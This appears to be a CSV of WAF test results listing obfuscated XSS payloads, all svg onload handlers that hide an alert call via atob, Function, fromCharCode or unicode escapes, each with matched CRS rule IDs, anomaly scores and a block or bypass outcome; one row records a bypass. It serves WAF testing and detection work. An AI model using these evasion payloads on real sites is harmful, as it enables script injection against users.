index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
112,"<svg onload=""(function(){var x=atob('YWxlcnQ=');window[x](1);})()"">",0,1,block,7,"934100,934100,941100,941160,941370,941390,949110","o14,11v221,67 || o13,11v221,67t:removeWhitespace || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,9v221,67t:urlDecodeUni,t:compressWhitespace || o31,5v221,67t:htmlEntityDecode,t:jsDecode || ",30,176482719510.932816
113,"<svg onload=""(function(){window.atob=Function;atob(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o14,11v221,126 || o13,11v221,126t:removeWhitespace || v221,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,5v221,126t:htmlEntityDecode,t:jsDecode || ",25,176482719749.220229
114,"<svg onload=""(new Function('al'+String.fromCharCode(101,114,116)+'(1)'))()"">",0,1,block,7,"934100,934100,934100,941100,941160,941390,949110","o14,13v221,76 || o14,13v221,76t:urlDecodeUni || o29,19v221,76t:removeWhitespace || v221,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,76t:htmlEntityDecode,t:jsDecode || ",30,176482720048.065599
115,"<svg onload=""(new Function('return \\u0061\\u006c\\u0065\\u0072\\u0074(1)'))()"">",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o36,6v221,80 || o14,13v221,80 || o14,13v221,80t:jsDecode || v221,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,80t:htmlEntityDecode,t:jsDecode || ",30,176482720313.143205
116,"<svg onload=""(new Function('return wind'+'ow\u002eal'+'ert'))()('XSS')"">",0,1,block,8,"920540,934100,934100,934100,941100,941160,941390,949110","v158,10o44,6v221,72 || o14,13v221,72 || o14,13v221,72t:urlDecodeUni || o14,13v221,72t:jsDecode || v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,72t:htmlEntityDecode,t:jsDecode || ",35,17648272062.004246
117,"<svg onload=""(new Function(atob('YWxlcnQoJ1hTUycp'))())""></svg>",0,1,block,5,"934100,941100,941160,941390,949110","o14,13v221,63 || v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,63t:htmlEntityDecode,t:jsDecode || ",20,176482720890.643745
118,"<svg onload=""Function('ale'+'rt(16)')()"">",0,1,block,5,"941100,941160,942100,942100,949110","v220,41t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,41t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v220,41 || v220,41t:urlDecodeUni || ",20,176482721194.296511
119,"<svg onload=""Function('return '+atob('YWxlcnQ=')+'(1)')()"">",0,1,block,5,"941100,941160,941390,942100,949110","v221,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,5v221,59t:htmlEntityDecode,t:jsDecode || v221,59 || ",20,176482721465.823564
120,"<svg onload=""Function('return al'+'ert(1)')()"">",0,1,block,5,"941100,941160,942100,942100,949110","v220,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v220,47 || v220,47t:urlDecodeUni || ",20,176482721770.963729
121,"<svg onload=""Function('return al'+String.fromCharCode(101,114,116)+'(1)')()"">",0,1,block,7,"934100,934100,934100,941100,941160,942100,949110","o34,19v221,77 || o34,19v221,77t:urlDecodeUni || o31,19v221,77t:removeWhitespace || v221,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v221,77 || ",30,176482721973.356002
122,"<svg onload=""Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941160,941390,949110","v220,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,5v220,47t:htmlEntityDecode,t:jsDecode || ",15,176482722263.790940
123,"<svg onload=""new Function(''+atob('YWxlcnQoMSk='))()"">",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v220,54 || o13,13v220,54t:urlDecodeUni || v220,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,54t:htmlEntityDecode,t:jsDecode || ",25,176482722560.536362
124,"<svg onload=""new Function('\u0061\u006c\u0065\u0072\u0074(1)')()"">",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o27,6v221,66 || o13,13v221,66 || o13,13v221,66t:jsDecode || v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,66t:htmlEntityDecode,t:jsDecode || ",30,176482722832.729192
125,"<svg onload=""new Function('al'+String.fromCharCode(101,114,116)+'(1)')()"">",0,1,block,7,"934100,934100,934100,941100,941160,941390,949110","o13,13v221,74 || o13,13v221,74t:urlDecodeUni || o28,19v221,74t:removeWhitespace || v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,74t:htmlEntityDecode,t:jsDecode || ",30,176482723018.734505
126,"<svg onload=""new Function('ale'+'rt(9)')()"">",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v220,44 || o13,13v220,44t:urlDecodeUni || v220,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,44t:htmlEntityDecode,t:jsDecode || ",25,176482723329.923838
127,"<svg onload=""new Function('return '+String.fromCharCode(97,108,101,114,116)+'(1)')()"">",0,1,block,7,"934100,934100,934100,941100,941160,941390,949110","o13,13v221,86 || o13,13v221,86t:urlDecodeUni || o32,19v221,86t:removeWhitespace || v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,86t:htmlEntityDecode,t:jsDecode || ",30,176482723619.569982
128,"<svg onload=""new Function('return ale' + 'rt')()(1)""></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v221,59 || o13,13v221,59t:urlDecodeUni || v221,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,59t:htmlEntityDecode,t:jsDecode || ",25,176482723960.875805
129,"<svg onload=""new Function(atob('YWxlcnQoMSk='))()""></svg>",0,1,block,5,"934100,941100,941160,941390,949110","o13,13v220,57 || v220,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,57t:htmlEntityDecode,t:jsDecode || ",20,176482724187.005132
130,"<svg onload=""new Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"934100,941100,941160,941390,949110","o13,13v220,59 || v220,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,59t:htmlEntityDecode,t:jsDecode || ",20,176482724453.195281
131,"<svg onload=""new Function(unescape('%61%6C%65%72%74%28%31%29'))()""></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v221,73 || o13,13v221,73t:urlDecodeUni || v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,73t:htmlEntityDecode,t:jsDecode || ",25,176482724742.218418
132,"<svg onload=""setTimeout(Function('al'+'ert(1)'),0)"">",0,1,block,4,"941100,941160,941390,949110","v220,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,11v220,52t:htmlEntityDecode,t:jsDecode || ",15,176482725091.114967
133,"<svg onload=""setTimeout(Function('return al'+'ert(1)'),0)"">",0,1,block,4,"941100,941160,941390,949110","v221,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,11v221,59t:htmlEntityDecode,t:jsDecode || ",15,176482725281.511364
134,"<svg onload=""setTimeout(function(){var a=atob('YWxlcnQoMSk=');eval(a)},0)""></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o62,7v221,81 || o24,11v221,81 || o23,11v221,81t:removeWhitespace || v221,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,11v221,81t:htmlEntityDecode,t:jsDecode || ",30,176482725542.012390
135,"<svg onload=""setTimeout(function(){window['\u0061lert'](9)},0)"">",0,1,block,9,"920540,934100,934100,934100,941100,941160,941370,941390,949110","v158,10o43,6v221,64 || o24,11v221,64 || o24,11v221,64t:jsDecode || o23,11v221,64t:removeWhitespace || v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,20v221,64t:urlDecodeUni,t:compressWhitespace || o13,11v221,64t:htmlEntityDecode,t:jsDecode || ",40,176482725876.350261
136,"<svg onload=""setTimeout(function(){window['al'+'ert'](1)},0)"">",0,1,block,8,"934100,934100,934100,941100,941160,941370,941390,949110","o24,11v221,62 || o24,11v221,62t:urlDecodeUni || o23,11v221,62t:removeWhitespace || v221,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,18v221,62t:urlDecodeUni,t:compressWhitespace || o13,11v221,62t:htmlEntityDecode,t:jsDecode || ",35,176482726119.170323
137,"<svg onload=""this.remove();(function(a){return eval(a)}('al'+'ert(1)'))()""></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o47,7v221,81 || o47,5v221,81 || o47,5v221,81t:urlDecodeUni || v221,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,5v221,81t:htmlEntityDecode,t:jsDecode || ",30,176482726331.752277
138,"<svg onload=""this.remove();(new Function('return al'+'ert'))()(1)"">",0,1,block,6,"934100,934100,941100,941160,941390,949110","o28,13v221,67 || o28,13v221,67t:urlDecodeUni || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,13v221,67t:htmlEntityDecode,t:jsDecode || ",25,17648272667.208170
139,"<svg onload=""this.remove();(new Function(atob('YWxlcnQoMSk=')))()"">",0,1,block,5,"934100,941100,941160,941390,949110","o28,13v221,67 || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,13v221,67t:htmlEntityDecode,t:jsDecode || ",20,176482726943.118940
140,"<svg onload=""this.remove();(new Function(unescape('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o28,13v221,89 || o28,13v221,89t:urlDecodeUni || v221,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,13v221,89t:htmlEntityDecode,t:jsDecode || ",25,176482727218.845572
141,"<svg onload=""this.remove();Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941160,941390,949110","v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,5v221,61t:htmlEntityDecode,t:jsDecode || ",15,176482727431.707337
142,"<svg onload=""this.remove();new Function('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')()""></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o39,55v221,107 || o27,13v221,107 || o39,5v221,107t:removeWhitespace || v221,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o27,13v221,107t:htmlEntityDecode,t:jsDecode || ",30,176482727749.859349
143,"<svg onload='(Function(""al""+""er""+""t(1)""))()'></svg>",0,1,bypass,2,"941100,941160","v221,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482728057.030593
144,"<svg onload='(function(){eval(atob(""YWxlcnQoMSk=""))})()'></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o25,25v221,63 || o14,11v221,63 || o13,11v221,63t:removeWhitespace || v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,5v221,63t:htmlEntityDecode,t:jsDecode || ",30,176482728348.726316
145,"<svg onload='(function(){var a=""a""+""l""+""e""+""r""+""t"";window[a](1)})()'>",0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,69 || o14,11v221,69t:urlDecodeUni || o13,11v221,69t:removeWhitespace || v221,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,9v221,69t:urlDecodeUni,t:compressWhitespace || ",30,176482728558.875617
146,<svg onload='(function(){var a=String.fromCharCode(97);var l=String.fromCharCode(108);var e=String.fromCharCode(101);var r=String.fromCharCode(114);var t=String.fromCharCode(116);eval(a+l+e+r+t+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))})()'>,0,1,block,8,"933160,934100,934100,934100,941100,941160,941390,949110","o179,38v221,272 || o14,11v221,272 || o14,11v221,272t:urlDecodeUni || o13,11v221,272t:removeWhitespace || v221,272t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,272t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o179,5v221,272t:htmlEntityDecode,t:jsDecode || ",35,176482728856.515627
147,<svg onload='(function(){var a=String.fromCharCode;window[a(97)+a(108)+a(101)+a(114)+a(116)](1)})()'/>,0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,102 || o14,11v221,102t:urlDecodeUni || o13,11v221,102t:removeWhitespace || v221,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,41v221,102t:urlDecodeUni,t:compressWhitespace || ",30,176482729143.382474
148,"<svg onload='(new Function(""\u0061\u006c\u0065\u0072\u0074(1)""))()'>",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o28,6v221,68 || o14,13v221,68 || o14,13v221,68t:jsDecode || v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,68t:htmlEntityDecode,t:jsDecode || ",30,176482729417.194178
149,"<svg onload='(new Function(""al""+""ert(1)""))()'>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o14,13v220,46 || o14,13v220,46t:urlDecodeUni || v220,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v220,46t:htmlEntityDecode,t:jsDecode || ",25,176482729677.611220
150,"<svg onload='(new Function(""ret""+""urn \u0061lert""))()(1)'>",0,1,block,8,"920540,934100,934100,934100,941100,941160,941390,949110","v158,10o38,6v221,58 || o14,13v221,58 || o14,13v221,58t:urlDecodeUni || o14,13v221,58t:jsDecode || v221,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,58t:htmlEntityDecode,t:jsDecode || ",35,176482729913.139620
151,"<svg onload='(new Function(""return \\u0061ler\\u0074""))()(/XSS/)'>",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o36,6v221,66 || o14,13v221,66 || o14,13v221,66t:jsDecode || v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,66t:htmlEntityDecode,t:jsDecode || ",30,176482730226.650416
152,"<svg onload='(new Function(""return \u0061\u006c\u0065\u0072\u0074""))()(1)'>",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o35,6v221,75 || o14,13v221,75 || o14,13v221,75t:jsDecode || v221,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,75t:htmlEntityDecode,t:jsDecode || ",30,176482730514.626185
153,"<svg onload='Function(atob(""d2luZG93LmFsZXJ0KDEp""))()'></svg>",0,1,block,4,"941100,941160,941390,949110","v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,5v221,61t:htmlEntityDecode,t:jsDecode || ",15,176482730870.340099
154,"<svg onload='new Function(""\u0061\u006c\u0065\u0072\u0074(1)"")()' />",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o27,6v221,68 || o13,13v221,68 || o13,13v221,68t:jsDecode || v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,68t:htmlEntityDecode,t:jsDecode || ",30,176482731062.428991
155,"<svg onload='new Function(""\u0061\u006c\u0065\u0072\u0074(1)"")()'>",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o27,6v221,66 || o13,13v221,66 || o13,13v221,66t:jsDecode || v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,66t:htmlEntityDecode,t:jsDecode || ",30,176482731389.955247
156,"<svg onload='new Function(""\u0061\u006c\u0065\u0072\u0074(17)"")()'>",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o27,6v221,67 || o13,13v221,67 || o13,13v221,67t:jsDecode || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,67t:htmlEntityDecode,t:jsDecode || ",30,176482731684.274247
157,"<svg onload='new Function(""\u0061\u006c\u0065\u0072\u0074(3)"")()'>",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o27,6v221,66 || o13,13v221,66 || o13,13v221,66t:jsDecode || v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,66t:htmlEntityDecode,t:jsDecode || ",30,176482731913.237698
158,"<svg onload='new Function(""a""+""l""+""ert(1)"")()'>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v220,47 || o13,13v220,47t:urlDecodeUni || v220,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,47t:htmlEntityDecode,t:jsDecode || ",25,176482732133.176961
159,"<svg onload='new Function(""var a=atob(\""YWxlcnQoMSk=\"");eval(a);"")()'></svg>",0,1,block,8,"933160,934100,934100,934100,941100,941160,941390,949110","o56,7v221,76 || o13,13v221,76 || o13,13v221,76t:jsDecode || o51,5v221,76t:removeWhitespace || v221,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,76t:htmlEntityDecode,t:jsDecode || ",35,176482732424.187711
160,"<svg onload='new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v221,85 || o24,19v221,85t:removeWhitespace || v221,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,85t:htmlEntityDecode,t:jsDecode || ",25,176482732784.608437
161,"<svg onload='new Function(String.fromCharCode(97,108,101,114,116,40,50,56,41))()'></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v221,88 || o24,19v221,88t:removeWhitespace || v221,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,88t:htmlEntityDecode,t:jsDecode || ",25,176482733064.192474
162,"<svg onload='new Function([].concat([""al""],[""ert""]).join("""")+""(1)"")()'></svg>",0,1,block,7,"934100,934100,941100,941160,941390,942151,949110","o13,13v221,77 || o13,13v221,77t:urlDecodeUni || v221,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,77t:htmlEntityDecode,t:jsDecode || o29,7v221,77t:urlDecodeUni || ",30,17648273326.118228
